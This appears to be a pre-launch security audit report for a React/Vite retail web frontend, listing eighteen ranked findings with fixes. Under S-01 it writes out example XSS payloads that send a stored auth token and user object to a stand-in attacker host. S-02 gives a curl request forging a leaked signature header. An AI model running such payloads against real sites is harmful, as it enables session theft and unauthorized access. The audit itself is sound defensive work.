# Security Audit Report — Final Retail Frontend

> **Audit date:** 2026-09-10  
> **Auditor role:** Application Security Engineer (pre-launch review)  
> **Scope:** `/Users/rudransh/Documents/Final Retail/final-retail/` — React 19 + TypeScript + Vite + TailwindCSS v4 SPA.  
> **Status:** READ-ONLY — no code has been changed. All fixes require your explicit approval.

---

## Summary Table (ranked by severity)

| # | ID | Severity | Category | File |
|---|---|---|---|---|
| 1 | S-01 | 🔴 Critical | Auth token stored in localStorage (XSS-stealable) | `src/hooks/useAuth.ts`, `src/providers/AuthProvider.tsx` |
| 2 | S-02 | 🔴 Critical | API signature key exposed client-side via `import.meta.env` | `.env`, `src/lib/axios.ts` |
| 3 | S-03 | 🔴 Critical | Virtually every route missing a `ProtectedRoute` / `OrganisationGuard` | `src/router/index.tsx` |
| 4 | S-04 | 🔴 Critical | `usertype` (role) is a user-controlled field on registration form | `src/pages/Authentication/Register.tsx` |
| 5 | S-05 | 🔴 Critical | `axios` ^1.13.4 — 30+ known CVEs (SSRF, prototype pollution, header injection, MitM) | `package.json` |
| 6 | S-06 | 🟠 High | Three parallel, conflicting auth systems — no single source of truth | `src/context/AuthContext.tsx`, `src/hooks/useAuth.ts`, `src/providers/AuthProvider.tsx` |
| 7 | S-07 | 🟠 High | `is_approved_by_admin` flag received from API but never enforced in frontend guards | `src/context/AuthContext.tsx` |
| 8 | S-08 | 🟠 High | Open redirect after login — attacker controls destination via `location.state.from.pathname` | `src/pages/Authentication/Login.tsx` |
| 9 | S-09 | 🟠 High | `.env` committed to git history (first commit `c4f492a`) exposes `NEXTAUTH_SECRET` | `.env` (git object `c4f492a`) |
| 10 | S-10 | 🟠 High | `vite` / `rollup` / `react-router` / `brace-expansion` — 14 high-severity CVEs in dev toolchain | `package.json` |
| 11 | S-11 | 🟡 Medium | Sensitive data leaked to browser console in production (`console.log` of form data, credentials, selected rows) | 20+ files |
| 12 | S-12 | 🟡 Medium | `LoginForm.tsx` (non-primary login page) does nothing on submit — silent no-op | `src/pages/Authentication/LoginForm.tsx` |
| 13 | S-13 | 🟡 Medium | No security headers on the Vite dev server or production build (CSP, X-Frame-Options, HSTS, etc.) | `vite.config.ts` |
| 14 | S-14 | 🟡 Medium | No client-side rate-limit / lock-out on login — unlimited credential-stuffing attempts | `src/pages/Authentication/Login.tsx` |
| 15 | S-15 | 🟡 Medium | `window.confirm()` used as delete confirmation in 24+ places — easily bypassed by automation / Selenium | 24 provider files |
| 16 | S-16 | 🟡 Medium | `staleTime: 5 min` on customer/salesman list queries — stale data may show after logout if session is shared | `src/context/CustomerContext.tsx` |
| 17 | S-17 | 🟢 Low | `LoginForm.tsx` renders non-functional Google / Facebook OAuth buttons that do nothing | `src/pages/Authentication/LoginForm.tsx` |
| 18 | S-18 | 🟢 Low | Password minimum-length check on login page is only 6 characters (vs. 8 on register) | `src/pages/Authentication/Login.tsx` |

---

## Detailed Findings

---

### S-01 🔴 Critical — Auth token stored in `localStorage` (XSS-stealable)

**Files / lines:**
- `src/hooks/useAuth.ts` lines 41-42, 58, 69-70, 84-85, 102
- `src/providers/AuthProvider.tsx` lines 29, 41, 46, 65-66, 79-80, 86-87, 101

**How it would be exploited:**  
Any XSS on any page (e.g., an unsanitised search parameter reflected in an error message) lets an attacker run:
```js
fetch('https://attacker.com/steal?t=' + localStorage.getItem('rc-auth-token'));
// or
fetch('https://attacker.com/steal?u=' + localStorage.getItem('user'));
```
The attacker receives the full bearer token and serialised user object (including email, role, org ID) and can replay them from any device without ever needing the password. The HttpOnly session cookie used by Sanctum (the correct mechanism) **cannot** be stolen this way — but this legacy token layer completely undermines it.

**Root cause:** Two dead-code auth stacks (`useAuth.ts` and `AuthProvider.tsx`) were never removed and both write tokens to `localStorage`.

**Exact fix:**

1. **Delete** `src/hooks/useAuth.ts` entirely — it is unused by the live app (which uses `AuthContext.tsx`).
2. **Delete** `src/providers/AuthProvider.tsx` entirely — also unused by the live router.
3. In `src/services/api.js` (the legacy file), remove the `localStorage.removeItem('isAuthenticated')` on line 40 — it references a flag that was never set.
4. Verify `src/context/AuthContext.tsx` (the live auth layer) **never** writes anything to `localStorage`. It currently does not — it relies purely on Sanctum session cookies. ✅

```diff
// src/hooks/useAuth.ts — DELETE entire file
// src/providers/AuthProvider.tsx — DELETE entire file
```

---

### S-02 🔴 Critical — API signature key exposed client-side via `import.meta.env`

**Files / lines:**
- `.env` line 6: `VITE_API_SIGNATURE=retail-app-signature-key`
- `src/lib/axios.ts` lines 39-42

**How it would be exploited:**  
Every `VITE_*` variable is **compiled into the JavaScript bundle** by Vite at build time. Anyone who opens DevTools → Sources → `index-[hash].js` and searches for `signature` will find the plaintext value `retail-app-signature-key`. With this key, an attacker can forge any request to the Laravel backend that uses this header for route authentication, completely bypassing the intended "only our frontend can call this API" guard.

```bash
# Attacker script — no login required if backend only checks x-signature:
curl https://api.retail.test/api/customer/all \
  -H "x-signature: retail-app-signature-key" \
  -H "Accept: application/json"
```

**Exact fix:**

This key must **never** use the `VITE_` prefix. Move it to the backend:

```diff
# .env — remove VITE_ prefix version entirely
- VITE_API_SIGNATURE=retail-app-signature-key
- API_SIGNATURE=retail-app-signature-key
```

The backend (Laravel) should validate this as a middleware secret using `config('app.signature_key')` sourced from its own `.env`, never from a client-injected header. The frontend should **not** send `x-signature` at all — authentication is already handled by Sanctum session cookies.

```diff
// src/lib/axios.ts lines 39-42 — remove entirely:
-   const signature = import.meta.env.VITE_API_SIGNATURE;
-   if (signature) {
-     config.headers['x-signature'] = signature;
-   }
```

---

### S-03 🔴 Critical — Virtually every route missing a `ProtectedRoute` / `OrganisationGuard`

**File / lines:** `src/router/index.tsx` lines 118-756

**How it would be exploited:**  
`ProtectedRoute` is only used on **one** route (`/organisation/add`, line 731).  
`OrganisationGuard` is only used on **one** route (`/dashboard`, line 110).  

Every other route — `/customer`, `/item`, `/salesman`, `/order`, `/invoice`, `/settings/*`, `/reports/*` etc. — wraps only `<Layout>` with **no auth guard**. An unauthenticated user who navigates to `/customer` in a fresh browser session will:
1. Render the page (no redirect to `/login`).
2. Trigger React Query to fire `GET /api/customer/list` — the API will return 401, which the Axios interceptor catches and redirects, BUT the component is already rendered and may already hold data from the query cache if the same browser was previously authenticated.

More critically, if the Sanctum session is still alive (e.g., tab restored after browser restart), an unauthenticated-looking browser state still fetches real data from the API with no frontend gate.

**Exact fix:**

Wrap every application route in `OrganisationGuard` (which already checks both `isAuthenticated` AND `organisationComplete`):

```diff
// src/router/index.tsx — example for /customer:
  {
    path: '/customer',
    element: (
-     <Layout>
-       <CustomerProvider>
-         <CustomerList />
-       </CustomerProvider>
-     </Layout>
+     <OrganisationGuard>
+       <Layout>
+         <CustomerProvider>
+           <CustomerList />
+         </CustomerProvider>
+       </Layout>
+     </OrganisationGuard>
    ),
  },
```

Apply this pattern to **all** routes except `/login`, `/register`, and `/organisation/add`.

---

### S-04 🔴 Critical — `usertype` (role) is a user-controlled field on the registration form

**File / lines:** `src/pages/Authentication/Register.tsx` lines 13-14, 98-101, 214-231

**How it would be exploited:**  
The registration form contains a `<select>` that lets any self-registering user choose their own role:
```
{ value: 1, label: 'Admin' }
{ value: 2, label: 'Salesman' }
```

An attacker can register with `usertype: 1` (Admin) directly from the UI. Even if the backend has an `is_approved_by_admin` gate, this means they enter the system already claiming Admin role. If backend validation is missing or later relaxed, attackers get full admin access on day one.

Additionally, anyone can POST directly to `/api/auth/register` with `usertype: 99` or any arbitrary integer to probe for undocumented roles.

**Exact fix:**

Remove the `usertype` field from the registration form entirely. The backend should assign a safe default role (e.g., `Salesman`) and only allow admins to promote users via a protected admin API:

```diff
// src/pages/Authentication/Register.tsx
interface RegisterFormData {
  firstname: string;
  lastname: string;
  email: string;
  password: string;
  password_confirmation: string;
  mobile?: string;
- usertype: number;
  org_name?: string;
}

const initialFormData: RegisterFormData = {
  ...
- usertype: 1,
  ...
};

// Remove the entire <div> block for the "User Type" select (lines 210-231)
// Remove watchedUsertype references
```

On the backend (Laravel), set `usertype` to a hardcoded safe default in the `AuthController@register` method and never trust it from the request body.

---

### S-05 🔴 Critical — `axios` ^1.13.4 carries 30+ known CVEs

**File / line:** `package.json` line 15

**CVEs of note (from `npm audit`):**
| Advisory | Impact |
|---|---|
| GHSA-3p68-rc4w-qgx5 | SSRF via NO_PROXY hostname normalization bypass |
| GHSA-w9j2-pvgh-6h63 | Auth bypass via prototype pollution in `validateStatus` |
| GHSA-pf86-5x62-jrwf | Prototype pollution → response tampering, data exfiltration |
| GHSA-xx6v-rp6x-q39c | XSRF token cross-origin leakage via prototype pollution |
| GHSA-mmx7-hfxf-jppx | Request construction alteration via prototype pollution |
| GHSA-6chq-wfr3-2hj9 | Header injection via prototype pollution |

**How it would be exploited:**  
The prototype pollution gadgets are the most dangerous in this SPA context. An attacker who can influence any JS object in the page (e.g., via a malicious API response or a stored-XSS payload) can pollute `Object.prototype` and then use Axios's merge functions to inject arbitrary headers, exfiltrate credentials, or redirect requests to attacker-controlled endpoints.

**Exact fix:**

```bash
npm audit fix
# If breaking changes:
npm install axios@latest
```

Pin to the latest patched release (≥1.8.x as of audit date). Then run `npm audit` again to verify all axios advisories are resolved.

---

### S-06 🟠 High — Three parallel, conflicting auth systems

**Files:**
- `src/context/AuthContext.tsx` — used by the router (live system, cookie-based ✅)
- `src/hooks/useAuth.ts` — stores bearer token in localStorage (dead code, but loaded)
- `src/providers/AuthProvider.tsx` — second context with its own localStorage token (dead code, but loaded)

**How it would be exploited:**  
Both dead-code systems still execute `localStorage.get/set/remove` on mount, creating race conditions with the live Sanctum session. An attacker can:
1. Log in via the live system (session cookie set).
2. Observe that `AuthProvider` also reads `localStorage.getItem('token')` on every mount.
3. Inject a fake `token` and `user` JSON into `localStorage` via a browser extension or XSS.
4. `AuthProvider` will pick it up and call `getCurrentUser()` with the session cookie — if the session is still valid, this returns real user data which is then written back to localStorage, polluting the auth state.

The conflicting `isAuthenticated` flags (`!!user` in AuthProvider vs. `isAuthenticated` boolean in AuthContext) can cause split-brain conditions where one context says the user is logged in and another says not.

**Exact fix:**  
Delete `src/hooks/useAuth.ts` and `src/providers/AuthProvider.tsx` (same as S-01 fix). `src/context/AuthContext.tsx` is the correct, cookie-based system.

---

### S-07 🟠 High — `is_approved_by_admin` flag never enforced in frontend guards

**File / line:** `src/context/AuthContext.tsx` line 27 (type), line 99 (received from API but discarded in `applyUser`)

**How it would be exploited:**  
The `User` type declares `is_approved_by_admin: boolean`, and the backend presumably returns it. However:
1. `ProtectedRoute` only checks `isAuthenticated` — not `is_approved_by_admin`.
2. `OrganisationGuard` only checks `isAuthenticated` and `organisationComplete`.
3. `applyUser()` in AuthContext sets `organisationComplete` but never reads `is_approved_by_admin`.

So a freshly registered user who is **pending admin approval** can fully access all application features immediately after registration redirects them to `/organisation/add`.

**Exact fix:**

Add an `isApproved` state and check in `applyUser`, then add a guard:

```diff
// src/context/AuthContext.tsx
const [organisationComplete, setOrganisationComplete] = useState(false);
+ const [isApproved, setIsApproved] = useState(false);

const applyUser = (u: User) => {
  setUser(u);
  setIsAuthenticated(true);
+ setIsApproved(u.is_approved_by_admin);
  const isComplete = Boolean(
    u.organisation?.is_complete ||
    u.organisation?.org_company_id ||
    u.organisation?.org_phone
  );
  setOrganisationComplete(isComplete);
};
```

Then add an `ApprovalGuard` component that redirects unapproved users to a `/pending-approval` page, and wrap all routes with it (after `ProtectedRoute`).

---

### S-08 🟠 High — Open redirect after login

**File / lines:** `src/pages/Authentication/Login.tsx` lines 35, 49-50

**How it would be exploited:**  
After a successful login, the app navigates to `location.state?.from?.pathname`. React Router's `location.state` is set by the calling code — in `ProtectedRoute.tsx` it is always a same-origin pathname. However, the `from` value is never sanitised. An attacker can craft a URL and pre-set `location.state = { from: { pathname: 'https://evil.com' } }` via a crafted link or social engineering. After the victim logs in, `navigate('https://evil.com', { replace: true })` fires (React Router's `navigate` accepts absolute URLs in some configurations).

**Exact fix:**

Validate that `from.pathname` is a relative path before trusting it:

```diff
// src/pages/Authentication/Login.tsx

+ const isSafeRedirect = (path: string): boolean =>
+   typeof path === 'string' && path.startsWith('/') && !path.startsWith('//');

  const postLoginPath = () =>
    organisationComplete ? '/dashboard' : '/organisation/add';

  useEffect(() => {
    if (isAuthenticated) {
      const from = (location.state as any)?.from?.pathname;
-     navigate(from ?? postLoginPath(), { replace: true });
+     navigate(from && isSafeRedirect(from) ? from : postLoginPath(), { replace: true });
    }
  }, [isAuthenticated, organisationComplete, navigate, location]);

  const onFormSubmit = async (data: LoginFormData) => {
    // ...
    if (result.success) {
      const from = (location.state as any)?.from?.pathname;
-     navigate(from ?? postLoginPath(), { replace: true });
+     navigate(from && isSafeRedirect(from) ? from : postLoginPath(), { replace: true });
    }
  };
```

---

### S-09 🟠 High — `.env` committed to git history — exposes `NEXTAUTH_SECRET`

**Evidence (verified by `git show c4f492a:.env`):**
```
NEXTAUTH_SECRET=your-nextauth-secret-key-here
API_SIGNATURE=retail-app-signature-key
```

**Note:** The current `.gitignore` does NOT list `.env` (only `*.local`). `.env` is currently git-tracked.

**How it would be exploited:**  
Anyone with read access to the git repository (including any future collaborator, GitHub leak, or accidental public push) gets both secrets. If `NEXTAUTH_SECRET` was ever used in a production NextAuth.js deployment, an attacker can forge signed JWTs for any user — including admins — with no further access needed.

**Exact fix:**

```bash
# Step 1: Add .env to .gitignore
echo ".env" >> .gitignore
echo ".env.*" >> .gitignore

# Step 2: Untrack current .env
git rm --cached .env
git commit -m "chore: untrack .env"

# Step 3: Purge from git history
git filter-repo --path .env --invert-paths

# Step 4: Force-push + rotate BOTH secrets immediately
```

---

### S-10 🟠 High — 14 high-severity CVEs in dev toolchain

**File / line:** `package.json` lines 25-26, 33, 40

**Key advisories:**
| Package | Advisory | Impact |
|---|---|---|
| `vite` ^7.2.4 | Multiple | Dev server path traversal, source leakage |
| `react-router` ^7.12.0 | High | XSS in error boundary, type confusion |
| `rollup` (transitive) | High | Arbitrary code execution during build |
| `brace-expansion` | GHSA-f886-m6hf-6m8v | ReDoS / OOM via crafted input |

**Exact fix:**
```bash
npm audit fix
npm install react-router-dom@latest vite@latest
npm audit   # verify 0 high/critical remain
```

---

### S-11 🟡 Medium — Sensitive data leaked to browser console

**Selected files / lines (most severe):**
- `src/pages/Authentication/LoginForm.tsx:28` — `console.log('Login data:', formData)` logs **email + password**
- `src/pages/Orders/OrderAdd.tsx:175` — logs full order with customer details
- `src/pages/GRN/GRNAdd.tsx:95` — logs full GRN form data
- `src/router/index.tsx:190` — logs full salesman object
- 20+ other list/bulk-action files log selected row UUIDs

**How it would be exploited:**  
In a shared office environment (retail counter, warehouse), any person who opens DevTools → Console after a previous user's session sees all submitted form data including credentials. Browser extensions also have access to console output.

**Exact fix:**  
Create a dev-only logger and replace all `console.log` calls:

```typescript
// src/lib/logger.ts (new file)
const isDev = import.meta.env.DEV;
export const logger = {
  log: (...args: unknown[]) => isDev && console.log(...args),
  error: (...args: unknown[]) => isDev && console.error(...args),
};
```

The `console.log('Login data:', formData)` at `LoginForm.tsx:28` must be **deleted outright** — never log credentials, even in dev.

---

### S-12 🟡 Medium — `LoginForm.tsx` is a silent no-op on submit

**File / line:** `src/pages/Authentication/LoginForm.tsx` lines 26-29

**Current code:**
```tsx
const handleSubmit = (e: React.FormEvent) => {
  e.preventDefault();
  console.log('Login data:', formData);  // Does nothing — no API call
};
```

**How it would be exploited:**  
If this component is ever wired up as the real login handler (e.g., during a merge conflict), users can enter valid credentials, click Sign In, and receive no response — while their credentials are logged to the console.

**Exact fix:** Delete `LoginForm.tsx` — a real, functional `Login.tsx` already exists and is used by the router.

```bash
rm src/pages/Authentication/LoginForm.tsx
```

---

### S-13 🟡 Medium — No security headers configured

**File / line:** `vite.config.ts` (entire file — no header configuration)

**Missing headers and their impact:**
| Header | Missing impact |
|---|---|
| `Content-Security-Policy` | No XSS mitigation — inline scripts unrestricted |
| `X-Frame-Options: DENY` | Clickjacking via `<iframe>` embedding |
| `X-Content-Type-Options: nosniff` | MIME-type sniffing attacks |
| `Strict-Transport-Security` | HTTPS downgrade / SSL strip |
| `Referrer-Policy` | Full URLs leak in Referer header |

**Exact fix:**

Dev server headers in `vite.config.ts`:
```diff
export default defineConfig({
  plugins: [react(), tailwindcss()],
+ server: {
+   headers: {
+     'X-Frame-Options': 'DENY',
+     'X-Content-Type-Options': 'nosniff',
+     'Referrer-Policy': 'strict-origin-when-cross-origin',
+   },
+ },
  resolve: { alias: { '@': path.resolve(__dirname, './src') } },
});
```

For production, configure CSP + HSTS at the **nginx / Caddy** level (not in the SPA bundle).

---

### S-14 🟡 Medium — No client-side rate limiting on login

**File / line:** `src/pages/Authentication/Login.tsx` lines 40-61

**How it would be exploited:**  
No attempt counter, no CAPTCHA, no lockout delay. An attacker can script unlimited credential-stuffing attempts at network speed.

**Exact fix:**

```diff
// src/pages/Authentication/Login.tsx
+ const [attemptCount, setAttemptCount] = useState(0);
+ const [lockoutUntil, setLockoutUntil] = useState<number | null>(null);

  const onFormSubmit = async (data: LoginFormData) => {
+   if (lockoutUntil && Date.now() < lockoutUntil) {
+     const secsLeft = Math.ceil((lockoutUntil - Date.now()) / 1000);
+     setError('root', { message: `Too many attempts. Try again in ${secsLeft}s.` });
+     return;
+   }
    try {
      const result = await login({ email: data.email, password: data.password });
      if (result.success) {
+       setAttemptCount(0);
        const from = (location.state as any)?.from?.pathname;
        navigate(from ?? postLoginPath(), { replace: true });
      } else {
+       const next = attemptCount + 1;
+       setAttemptCount(next);
+       if (next >= 5) {
+         setLockoutUntil(Date.now() + Math.min(30_000 * (next - 4), 300_000));
+       }
        setError('root', { message: result.message || 'Login failed' });
      }
    } catch (error: any) { /* ... */ }
  };
```

Also ensure the Laravel backend has `ThrottleRequests` middleware on `POST /api/auth/login`.

---

### S-15 🟡 Medium — `window.confirm()` as delete confirmation in 24+ providers

**Files (sample):** `src/context/CustomerContext.tsx:370`, `src/providers/BeatProvider.tsx:55`, `src/providers/TaxProvider.tsx:55`, and 21 others.

**How it would be exploited:**  
`window.confirm()` can be suppressed by setting `window.confirm = () => true` in the DevTools console, instantly enabling bulk-delete of all records without any per-item confirmation.

**Exact fix:**  
Replace all `window.confirm` delete flows with a React modal confirmation component (per the existing modal pattern in `CLAUDE.md`):

```tsx
// In each provider — example for CustomerContext:
const [pendingDeleteUuid, setPendingDeleteUuid] = useState<string | null>(null);

const handleDeleteWithConfirmation = (uuid: string) => setPendingDeleteUuid(uuid);
// Wire a <ConfirmDeleteModal> to pendingDeleteUuid in the list component
```

---

### S-16 🟡 Medium — React Query `staleTime: 5 min` may serve stale data post-logout

**File / lines:** `src/context/CustomerContext.tsx` lines 172, 180, 190, 199

**How it would be exploited:**  
When a user logs out and a second user logs in on the same browser (common in shared offices), React Query's in-memory cache still holds the first user's data. The second user may see the first user's customer list before the cache invalidates.

**Exact fix:**

Clear the entire query cache on logout:

```diff
// src/context/AuthContext.tsx
+ import { useQueryClient } from '@tanstack/react-query';

  export const AuthProvider = ({ children }) => {
+   const queryClient = useQueryClient();

    const logout = async () => {
      try {
        await AuthApi.logout();
      } catch (error) {
        console.error('Logout error:', error);
      } finally {
+       queryClient.clear();   // Nuke all cached data on logout
        clearUser();
        window.location.href = '/login';
      }
    };
```

---

### S-17 🟢 Low — Non-functional OAuth buttons on login page

**File / lines:** `src/pages/Authentication/LoginForm.tsx` lines 147-169

**Exact fix:** Delete `LoginForm.tsx` (see S-12). Or remove the Google/Facebook buttons until OAuth is actually implemented.

---

### S-18 🟢 Low — Password minimum length inconsistency

**Files / lines:**
- `src/pages/Authentication/Login.tsx:116` — `minLength: { value: 6 }`
- `src/pages/Authentication/Register.tsx:269` — `minLength: { value: 8 }`

**Exact fix:**
```diff
// src/pages/Authentication/Login.tsx line 116:
- value: 6,
+ value: 8,
```

---

## Categories with No Findings

| Category | Status |
|---|---|
| SQL / NoSQL Injection | ✅ **Clean** — Pure SPA; no direct DB queries in this codebase. All operations go through the Laravel API. |
| Command Injection | ✅ **Clean** — No `exec`, `spawn`, `eval`, or similar APIs called with user input anywhere in `src/`. |
| `dangerouslySetInnerHTML` / `innerHTML` XSS | ✅ **Clean** — Zero occurrences found in the entire `src/` directory. |
| Insecure Direct Object References (IDOR) | ✅ **Clean (frontend)** — All resource references use UUIDs (`/customer/delete/${uuid}`). IDOR enforcement is a backend responsibility; frontend uses opaque identifiers correctly. |
| CSRF | ✅ **Clean** — `withCredentials: true` + `X-XSRF-TOKEN` header forwarding in `src/lib/axios.ts:34-37` is the correct Sanctum SPA CSRF pattern. |
| Cookie flags (HttpOnly, Secure, SameSite) | ✅ **Clean (session cookie)** — Sanctum sets `HttpOnly` + `SameSite=Lax` server-side. The `XSRF-TOKEN` cookie is intentionally JavaScript-readable for CSRF protection. |

---

## Remediation Priority

| Priority | Actions | Effort |
|---|---|---|
| **P0 — Before any staging deploy** | S-01 (delete dead auth stacks), S-02 (remove VITE_API_SIGNATURE), S-03 (add route guards), S-04 (remove usertype from form), S-05 (`npm audit fix`) | ~4–6 hrs |
| **P0 — Immediate** | S-09 (purge .env from git history + rotate secrets) | ~1–2 hrs |
| **P1 — Before production** | S-06 (delete AuthProvider), S-07 (enforce is_approved), S-08 (safe redirect), S-10 (dep upgrades), S-11 (remove console.log), S-12 (delete LoginForm), S-13 (security headers) | ~4–8 hrs |
| **P2 — Before public launch** | S-14 (rate limiting), S-15 (confirm modals), S-16 (queryClient.clear) | ~3–6 hrs |
| **P3 — Post-launch backlog** | S-17, S-18 | < 1 hr |
